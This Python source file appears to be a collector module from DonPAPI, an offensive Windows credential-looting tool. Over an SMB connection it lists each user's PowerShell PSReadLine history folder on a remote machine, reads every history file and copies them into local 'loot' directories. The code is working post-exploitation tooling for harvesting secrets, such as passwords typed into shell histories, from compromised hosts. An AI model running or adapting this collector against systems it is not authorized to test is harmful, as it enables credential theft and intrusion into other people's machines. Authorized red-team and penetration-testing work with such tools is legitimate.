import ntpath
from os import path
from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter
from donpapi.lib.utils import dump_file_to_loot_directories


class PowerShellHistory:
    user_directories = ["\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\"]

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize
        self.found = 0

    def run(self):
        self.logger.display("Gathering powershell history files")
        for user in self.context.users:
            for directory in self.user_directories:
                directory_path = directory.format(username=user)
                self.dig_files(directory_path=directory_path, recurse_level=0, recurse_max=10)
        if self.found > 0:
            self.logger.secret(f"Found {self.found} powershell history files", self.tag)

    def dig_files(self, directory_path, recurse_level=0, recurse_max=10):
        directory_list = self.conn.remote_list_dir(self.context.share, directory_path)
        if directory_list is not None:
            for item in directory_list:
                if item.get_longname() not in self.false_positive:
                    
                    new_path = ntpath.join(directory_path, item.get_longname())
                    file_content = self.conn.readFile(self.context.share, new_path)
                    self.found += 1

                    absolute_local_filepath = path.join(self.context.target_output_dir, *(new_path.split('\\')))
                    dump_file_to_loot_directories(absolute_local_filepath, file_content)
                    
                    collector_dir_local_filepath = path.join(self.context.global_output_dir, self.tag, new_path.replace("\\", "_"))
                    dump_file_to_loot_directories(collector_dir_local_filepath, file_content)
                   